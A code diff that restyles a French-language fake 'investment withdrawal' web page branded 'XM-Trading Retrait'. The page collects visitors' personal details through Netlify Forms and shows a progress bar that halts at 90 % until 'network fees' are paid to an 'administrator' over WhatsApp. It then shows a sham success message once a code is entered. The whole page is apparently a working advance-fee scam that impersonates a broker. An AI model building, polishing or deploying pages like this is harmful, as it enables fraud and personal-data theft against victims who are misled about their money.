@@ -4,67 +4,109 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Retrait d’investissement</title>
+  <!-- Google Font Montserrat -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
   <!-- Styles intégrés pour éviter dossier CSS -->
   <style>
     /* Reset minimal */
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      height: 100%;
+    }
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Montserrat', Arial, sans-serif;
       background-color: #f5f5f5;
       color: #333;
       line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+    }
+    a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
     }
 
-    /* Header en-tête */
+    /* Header */
     header.site-header {
-      width: 100%;
-      height: 200px;
-      /* Si vous avez un fichier header.jpg à la racine, le référencer ainsi : */
-      background-image: url('header.jpg');
-      background-size: cover;
-      background-position: center;
+      background-color: #000;
+      color: #fff;
+      padding: 15px 20px;
       display: flex;
       align-items: center;
-      justify-content: center;
+      justify-content: space-between;
+      /* Si vous avez un logo : placez une balise <img> dans le HTML */
+    }
+    header.site-header .logo {
+      display: flex;
+      align-items: center;
+    }
+    header.site-header .logo img {
+      height: 40px;
+      margin-right: 10px;
     }
     header.site-header h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+    }
+    header.site-header nav a {
+      margin-left: 20px;
+      font-weight: 500;
       color: #fff;
-      background-color: rgba(0,0,0,0.5);
-      padding: 10px 20px;
-      border-radius: 5px;
+    }
+    header.site-header nav a:hover {
+      color: #007bff;
     }
 
+    /* Container principal */
     .container {
-      max-width: 600px;
-      margin: 30px auto;
+      flex: 1;
+      max-width: 700px;
+      width: 100%;
+      margin: 20px auto;
       background-color: #fff;
-      padding: 20px;
-      border-radius: 5px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
-
+    .container h2 {
+      margin-bottom: 15px;
+      font-size: 1.4rem;
+      color: #000;
+    }
+    .container p {
+      margin-bottom: 15px;
+    }
     form label {
       display: block;
       margin-bottom: 5px;
-      font-weight: bold;
+      font-weight: 500;
+      color: #222;
     }
     form input[type="text"],
     form input[type="number"],
     form select {
       width: 100%;
-      padding: 8px;
+      padding: 10px;
       margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 4px;
+      font-size: 1rem;
     }
     form input[type="tel"] {
-      width: calc(100% - 60px);
-      padding: 8px;
+      width: calc(100% - 70px);
+      padding: 10px;
       margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      margin-left: 60px;
+      margin-left: 70px;
+      font-size: 1rem;
     }
     .phone-prefix {
       position: relative;
@@ -75,24 +117,34 @@
       left: 10px;
       top: 50%;
       transform: translateY(-50%);
-      font-size: 14px;
+      font-size: 0.95rem;
       color: #555;
     }
     .phone-prefix input {
-      padding-left: 50px;
+      padding-left: 55px;
     }
-
+    input::placeholder {
+      color: #999;
+    }
+    /* Boutons */
     button, input[type="submit"] {
       background-color: #007bff;
       color: white;
       border: none;
-      padding: 10px 15px;
+      padding: 12px 20px;
       cursor: pointer;
       border-radius: 4px;
-      font-size: 16px;
+      font-size: 1rem;
+      font-weight: 500;
+      transition: background-color 0.2s ease;
     }
     button:hover, input[type="submit"]:hover {
       background-color: #0056b3;
+    }
+    /* Petit lien sous le formulaire initial */
+    #initial-section p a {
+      color: #007bff;
+      font-size: 0.95rem;
     }
 
     /* Modal overlay */
@@ -115,11 +167,17 @@
     }
     .modal-content {
       background-color: #fff;
-      padding: 20px;
+      padding: 25px 20px;
       width: 90%;
-      max-width: 400px;
-      border-radius: 5px;
+      max-width: 450px;
+      border-radius: 8px;
       text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+    .modal-content p {
+      font-size: 1rem;
+      margin-bottom: 15px;
+      color: #222;
     }
     .progress-bar-container {
       width: 100%;
@@ -131,8 +189,24 @@
     .progress-bar {
       width: 0%;
       height: 20px;
-      background-color: #28a745;
+      background-color: #007bff;
       transition: width 0.3s ease;
+    }
+    #feeSection p {
+      margin-top: 15px;
+      font-size: 0.95rem;
+      color: #333;
+    }
+    #feeSection p a {
+      color: #d9534f; /* rouge accent pour contact */
+      font-weight: 500;
+    }
+    #feeSection button {
+      margin-top: 15px;
+      background-color: #28a745; /* vert pour l’étape “J’ai un code” */
+    }
+    #feeSection button:hover {
+      background-color: #218838;
     }
 
     /* Section succès inline */
@@ -141,36 +215,83 @@
       margin-top: 20px;
       text-align: center;
     }
+    #success-section h2 {
+      font-size: 1.6rem;
+      margin-bottom: 15px;
+      color: #fff;
+    }
+    #success-section p {
+      margin-bottom: 10px;
+      color: #fff;
+      font-size: 1rem;
+    }
     body.success-mode {
-      /* Si vous avez success-bg.jpg à la racine, remplacez ou retirez */
       background-image: url('success-bg.jpg');
       background-size: cover;
       background-position: center;
       color: #fff;
     }
     body.success-mode .container {
-      background-color: rgba(0,0,0,0.6);
+      background-color: rgba(0,0,0,0.7);
       color: #fff;
     }
 
-    /* Petit lien sous le formulaire initial */
-    #initial-section p a {
-      color: #007bff;
-      text-decoration: none;
+    /* Footer */
+    footer.site-footer {
+      background-color: #000;
+      color: #ccc;
+      padding: 15px 20px;
+      text-align: center;
+      font-size: 0.9rem;
     }
-    #initial-section p a:hover {
-      text-decoration: underline;
+    footer.site-footer a {
+      color: #007bff;
+    }
+    footer.site-footer a:hover {
+      color: #fff;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      header.site-header, footer.site-footer {
+        flex-direction: column;
+        text-align: center;
+      }
+      header.site-header nav a {
+        margin: 8px;
+      }
+      .container {
+        margin: 15px;
+        padding: 20px;
+      }
+      .modal-content {
+        padding: 20px;
+      }
     }
   </style>
 </head>
 <body id="page-index">
+  <!-- En-tête -->
   <header class="site-header">
-    <h1>Retrait d’investissement</h1>
+    <div class="logo">
+      <!-- Si vous avez un logo, décommentez : 
+      <img src="logo.png" alt="Logo"> 
+      -->
+      <h1>XM-Trading Retrait</h1>
+    </div>
+    <nav>
+      <!-- Exemples de liens : personnalisez si besoin -->
+      <a href="#initial-section">Accueil</a>
+      <a href="#initial-section">Demande</a>
+      <a href="#footer-contact">Contact</a>
+    </nav>
   </header>
 
+  <!-- Contenu principal -->
   <div class="container">
     <!-- SECTION 1 : Formulaire initial -->
     <div id="initial-section">
+      <h2>Demande de retrait</h2>
       <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
         <!-- Netlify Forms -->
         <input type="hidden" name="form-name" value="withdrawal-request">
@@ -179,10 +300,10 @@
         </p>
 
         <label for="firstName">Prénom</label>
-        <input type="text" id="firstName" name="firstName" required>
+        <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>
 
         <label for="lastName">Nom</label>
-        <input type="text" id="lastName" name="lastName" required>
+        <input type="text" id="lastName" name="lastName" placeholder="Votre nom de famille" required>
 
         <label for="country">Pays</label>
         <select id="country" name="country" required>
@@ -193,11 +314,11 @@
         <label for="phone">Téléphone</label>
         <div class="phone-prefix">
           <span id="phone-prefix">+XXX</span>
-          <input type="tel" id="phone" name="phone" placeholder="Votre numéro sans indicatif" required>
+          <input type="tel" id="phone" name="phone" placeholder="Numéro sans indicatif" required>
         </div>
 
         <label for="amount">Montant à retirer</label>
-        <input type="number" id="amount" name="amount" min="1" required>
+        <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
         <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
 
         <label for="currency">Devise</label>
@@ -208,13 +329,13 @@
         </select>
 
         <label for="profession">Métier</label>
-        <input type="text" id="profession" name="profession" required>
+        <input type="text" id="profession" name="profession" placeholder="Votre profession" required>
 
         <label for="age">Âge</label>
-        <input type="number" id="age" name="age" min="18" required>
+        <input type="number" id="age" name="age" placeholder="Ex. 30" min="18" required>
 
         <label for="investmentCode">Code d’investissement initial</label>
-        <input type="text" id="investmentCode" name="investmentCode" required>
+        <input type="text" id="investmentCode" name="investmentCode" placeholder="Code reçu auparavant" required>
         <small>Ce code initial doit vous avoir été communiqué par l’administrateur avant cette étape.</small>
 
         <input type="submit" value="Valider la demande">
@@ -228,10 +349,11 @@
 
     <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
     <div id="code-section" style="display: none;">
+      <h2>Confirmation finale</h2>
       <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
       <form id="confirm-form">
         <label for="newInvestmentCode">Nouveau code d’investissement</label>
-        <input type="text" id="newInvestmentCode" name="newInvestmentCode" required>
+        <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
         <input type="submit" value="Valider le code">
       </form>
       <p id="confirmError" style="color:red; display:none;">Veuillez saisir un code valide.</p>
@@ -240,7 +362,8 @@
     <!-- SECTION 3 : Succès (affichée en fin) -->
     <div id="success-section">
       <h2>Félicitations ! Votre retrait est finalisé</h2>
-      <p>Votre demande de retrait a été traitée avec succès. L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
+      <p>Votre demande de retrait a été traitée avec succès.</p>
+      <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
       <p>Le montant sera versé selon les modalités convenues.</p>
       <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
     </div>
@@ -257,13 +380,19 @@
         <p class="fee-message">
           La progression s’est arrêtée à 90 % car vous n’avez pas soldé les frais de réseau.<br>
           Veuillez contacter l’administrateur pour solder ces frais :<br>
-          Email : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a><br>
-          WhatsApp : +237 6XXXXXXX
+          <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a><br>
+          <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
         </p>
         <button id="haveCodeBtn">J’ai réglé, j’ai un code</button>
       </div>
     </div>
   </div>
+
+  <!-- Footer -->
+  <footer class="site-footer" id="footer-contact">
+    <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
+    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
+  </footer>
 
   <!-- Mapping pays-indicatif et logique JS inline -->
   <script>
@@ -370,7 +499,13 @@
             }
             return;
           }
-          // Optionnel : valider un pattern minimal, ex. /^[A-Z0-9]{6,8}$/ 
+          // Exemple de validation de format (optionnel) :
+          // const pattern = /^[A-Z0-9]{6,8}$/;
+          // if (!pattern.test(code)) {
+          //   confirmError.textContent = "Code invalide (6-8 caractères alphanumériques majuscules).";
+          //   confirmError.style.display = 'block';
+          //   return;
+          // }
           if (confirmError) confirmError.style.display = 'none';
           showFinalProgress();
         });
